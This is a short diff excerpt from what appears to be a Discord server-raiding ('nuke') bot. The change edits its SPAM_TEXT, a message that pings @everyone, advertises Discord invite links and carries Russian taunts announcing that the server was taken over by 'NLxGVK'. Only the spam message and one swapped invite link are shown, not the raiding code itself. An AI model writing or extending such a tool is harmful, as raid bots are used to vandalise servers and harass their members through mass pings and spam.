@@ -39,7 +39,7 @@ async def nuke(ctx):
     SPAM_TEXT = """@everyone
 **ТРАХНУТЫ BY GVK X NL**
 
-https://discord.gg/neverlosehdhenrhd
+https://discord.gg/neverlosetsb
 https://discord.gg/HTr7pU7ttZ
 
 ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ NLxGVK
